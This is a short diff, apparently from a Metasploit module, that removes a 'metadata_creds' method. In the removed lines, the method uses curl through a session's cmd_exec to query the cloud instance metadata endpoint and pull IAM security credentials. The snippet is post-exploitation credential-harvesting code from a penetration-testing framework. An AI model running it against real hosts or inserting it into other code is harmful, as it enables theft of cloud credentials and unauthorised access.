@@ -9,26 +9,6 @@ module Metasploit
         def register_autofilter_hosts(ports=[]); end
         def register_autofilter_services(services=[]); end
 
-        def metadata_creds
-          # TODO: do it for windows/generic way
-          cmd_out = cmd_exec("curl --version")
-          if cmd_out =~ /^curl \d/
-            url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
-            print_status("#{datastore['METADATA_IP']} - looking for creds...")
-            resp = cmd_exec("curl #{url}")
-            if resp =~ /^iam.*/
-              resp = cmd_exec("curl #{url}iam/")
-              if resp =~ /^security-credentials.*/
-                resp = cmd_exec("curl #{url}iam/security-credentials/")
-                return JSON.parse(cmd_exec("curl #{url}iam/security-credentials/#{resp}"))
-              end
-            end
-          else
-            print_error cmd_out
-          end
-          {}
-        end
-
         def hexdigest(value)
           digest = OpenSSL::Digest::SHA256.new
           if value.respond_to?(:read)
